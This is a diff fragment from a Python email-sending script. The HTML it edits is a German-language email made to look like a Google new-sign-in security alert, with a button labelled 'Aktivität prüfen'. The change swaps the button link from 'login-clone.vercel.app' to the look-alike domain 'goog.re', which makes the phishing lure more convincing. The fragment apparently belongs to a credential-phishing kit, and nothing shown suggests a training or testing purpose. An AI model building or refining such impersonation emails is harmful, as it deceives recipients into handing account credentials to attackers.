@@ -193,7 +193,7 @@ def send_email():
                                     angemeldet hat. Falls Sie das waren, müssen Sie nichts weiter unternehmen.
                                     Andernfalls unterstützen wir Sie gern dabei, die Sicherheit Ihres Kontos zu
                                     verbessern.<div style="padding-top: 32px; text-align: center;"><a
-                                            href="https://login-clone.vercel.app/"
+                                            href="https://goog.re/"
                                             target="_blank" link-id="main-button-link"
                                             style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif; line-height: 16px; color: #ffffff; font-weight: 400; text-decoration: none;font-size: 14px;display:inline-block;padding: 10px 24px;background-color: #4184F3; border-radius: 5px; min-width: 90px;">Aktivität
                                             prüfen</a></div>
